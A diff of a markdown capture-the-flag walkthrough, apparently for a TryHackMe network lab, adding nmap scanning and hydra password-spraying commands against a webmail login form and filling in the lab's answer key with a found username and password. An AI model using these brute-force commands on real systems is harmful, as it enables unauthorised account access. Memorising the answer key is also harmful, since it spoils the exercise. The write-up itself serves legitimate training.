@@ -103,7 +103,7 @@ On the list of tools to try out brutespray and  is just a nice `apt-get install 
 `nmap -sV -sC -oA throwback -p- 10.200.0-255.0/24 --min-rate 5000` with -oA for outputing all formats and also a range over the 0-255, third octet, which did not do the first time. It will take longer but that is fine for reconing more indepth in the background while I setup password spraying in medusa and hydra. Don't forget to 	`gzip -d /usr/share/wordlists/rockyou.txt.gz` the rockyou list on the Kali VM.
 
 ```bash
-hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $MACHINE_IP http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS:F=incorrect' 
+hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $MACHINE_IP http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' 
 ```
 
 Consider that bruteforcing in this way is not very smart and the task is hinting at making a custom password list based on a set of strings:
@@ -116,9 +116,27 @@ Throwback2020
 Password123
 ```
 
-I decided to use mentalist password permutation, warning getting this to work on some mahcines has  been a nightmare, especially the THM VMs, when a certain CTF requires  a wordlist > GB!
+I decided to use mentalist password permutation, warning getting this to work on some mahcines has  been a nightmare, especially the THM VMs, when a certain CTF requires  a wordlist > GBs!
 
 ![mentalist-one](Screenshots/mentalist-wl-one.png)
+
+*Please waitWhatHappen for an explaination, too many mistakes occured and I had rewrite this section, but I am not going to glaze over my failings*
+
+To create a list of users I used `awk` and then piped with `>` into a usernames.txt  
+
+![wait-users](Screenshots/wait-usernames-awk.png)
+
+Post file removed, no reply account to speed up bruteforcing.
+```bash
+hydra -L usernames.txt -P passwords.txt 10.200.102.232  http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect'
+```
+
+![peanut](Screenshots/wait-hydra-peanuts-away.png)
+
+some more:
+
+![almost](Screenshots/wait-hydra-getting-there.png)
+
 
 ## Answers
 
@@ -132,7 +150,9 @@ secretkey
 ```
 What username found with hydra starts with an M?  
 ```{toggle}
+MurphyF
 ```
 What is the password found with hydra?
 ```{toggle}
+Summer2020
 ```
